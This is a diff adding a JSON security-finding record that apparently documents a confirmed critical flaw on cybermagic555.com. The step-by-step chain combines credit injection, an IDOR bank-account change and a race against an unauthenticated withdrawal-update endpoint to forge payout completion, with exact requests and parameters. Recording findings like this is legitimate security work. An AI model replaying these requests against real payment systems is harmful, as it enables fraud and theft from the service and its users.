@@ -1,0 +1,38 @@
+{
+  "finding": "F-PB24",
+  "title": "WithdrawTW No-Auth Completion Forge + Race Condition",
+  "severity": "CRITICAL",
+  "status": "CONFIRMED",
+  "date": "2026-10-17T20:38:19+07:00",
+  "target": "cybermagic555.com",
+  "attack_chain": {
+    "step1": "LINE God Mode -> #kz6+5000 -> kz6 credit +5000 THB",
+    "step2": "EditUserInfo IDOR -> kz6 bank changed to TW 0994399540",
+    "step3": "LINE bot ถ5000 as kzuid1792189577 -> withdraw_user ID=103 created (Status=w)",
+    "step4": "Thread 1: POST /api/Withdraw Action=SendRemote ID=103 BankConfigID=83 (blocks 75s)",
+    "step5": "Thread 2 (5s delay): POST /api/WithdrawTW Action=Update ID=103 Data={Status:Success,Msg:Balance 44500.00 THB}",
+    "step6": "Update accepted HTTP 200 with NO auth check",
+    "step7": "SendRemote PHP loop detected JsonRemote, executed success path",
+    "result": "withdraw_user ID=103 Status=y, BankRef=+ถอนทรูแล้ว+, TransferTime=2026-10-17 20:38:19"
+  },
+  "evidence": {
+    "withdrawal_id": 103,
+    "user": "kz6",
+    "amount": 5000.0,
+    "status": "y",
+    "bank_ref": "+ถอนทรูแล้ว+",
+    "transfer_time": "2026-10-17 20:38:19",
+    "done_by": "kz",
+    "bank_withdraw_id": "83",
+    "json_remote": "{\"Status\": \"Success\", \"Msg\": \"Balance 44500.00 THB\"}",
+    "no_real_transfer": true,
+    "real_tw_balance_unchanged": true
+  },
+  "vulnerable_endpoint": {
+    "url": "POST /api/WithdrawTW?Action=Update",
+    "auth": "NONE",
+    "params": {"ID": "withdraw_user.ID", "Data": "JSON {Status, Msg}"},
+    "impact": "Forge TW withdrawal completion for any pending SendRemote request"
+  },
+  "cwe": ["CWE-306 (Missing Authentication)", "CWE-362 (Race Condition)", "CWE-840 (Business Logic)"]
+}
